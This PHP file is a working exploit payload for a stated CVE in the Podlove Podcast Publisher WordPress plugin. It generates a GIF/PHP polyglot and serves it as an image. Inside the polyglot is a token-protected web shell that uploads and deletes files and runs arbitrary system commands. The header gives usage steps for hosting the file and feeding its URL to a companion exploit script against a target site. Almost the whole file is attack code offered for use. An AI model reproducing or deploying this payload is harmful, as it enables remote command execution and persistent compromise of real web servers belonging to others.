<?php
/**
 * CVE-2026-13001 — GIF89a PHP Polyglot Generator
 * Podlove Podcast Publisher <= 4.5.1 exploit payload
 * 
 * Usage:
 *   1. Host this file on any PHP server: php -S 0.0.0.0:9999 payload.php
 *   2. Use the URL as --payload-url in the exploit:
 *      python cve_2026_13001.py -t target.com --payload-url https://yourserver.com/payload.php
 */

// ── Generate the polyglot shell ──
$token = $_GET['t'] ?? bin2hex(random_bytes(8));

$shell = 'GIF89a' . chr(0x39) . chr(0x00) . chr(0x0c) . chr(0x00) . chr(0xf7)
    . str_repeat(chr(0x00), 8)
    . chr(0x21) . chr(0xf9) . chr(0x04) . chr(0x01) . chr(0x00) . chr(0x00) . chr(0x00)
    . chr(0x2c) . chr(0x00) . chr(0x00) . chr(0x00) . chr(0x00) . chr(0x0c)
    . chr(0x00) . chr(0x00) . chr(0x00) . chr(0x00) . chr(0x00)
    . chr(0x02) . chr(0x0c) . chr(0x8c) . chr(0x01) . chr(0x00) . chr(0x00) . chr(0x00);

// PHP file manager shell (fm_code equivalent)
$shell .= '<?php '
    . 'error_reporting(0);$t="' . $token . '";'
    . 'if(!isset($_GET["t"])||$_GET["t"]!==$t){http_response_code(404);die;}'
    . '$d=__DIR__;'
    . 'if(isset($_FILES["f"])){'
    . '$n=$_POST["n"]?:$_FILES["f"]["name"];'
    . 'move_uploaded_file($_FILES["f"]["tmp_name"],"$d/$n");die("OK|$n");'
    . '}'
    . 'if(isset($_GET["c"])){'
    . '$x=$_GET["c"]." 2>&1";echo"C|";'
    . 'if(function_exists("system"))system($x);'
    . 'elseif(function_exists("passthru"))passthru($x);'
    . 'elseif(function_exists("exec")){exec($x,$o);echo join("\n",$o);}'
    . 'elseif(function_exists("shell_exec"))echo shell_exec($x);'
    . 'else echo"no";echo"|E";die();}'
    . 'if(isset($_GET["del"])){unlink("$d/".basename($_GET["del"]));die("DEL");}'
    . '$fl="";foreach(scandir($d) as $f)if($f!="."&&$f!="..")'
    . '$fl.=htmlspecialchars($f)." (".filesize("$d/$f")."b) '
    . '<a href=\'?t=$t&del=' . urlencode($f) . '\'>[del]</a><br>";'
    . 'echo"<html><body style=\'font-family:monospace;background:#111;color:#0f0;padding:20px\'>'
    . '<h2>think</h2><p>Dir: $d</p>'
    . '<form method=post enctype=multipart/form-data>'
    . '<input type=file name=f><button>Upload</button></form>'
    . '<form method=get><input name=t value=$t type=hidden>'
    . '<input name=c placeholder=cmd><button>Exec</button></form>'
    . '<hr>$fl</body></html>";';

// ── Serve the polyglot ──
header('Content-Type: image/gif');
header('Content-Length: ' . strlen($shell));
header('Cache-Control: no-store, no-cache, must-revalidate');
header('X-Payload-Token: ' . $token);
echo $shell;
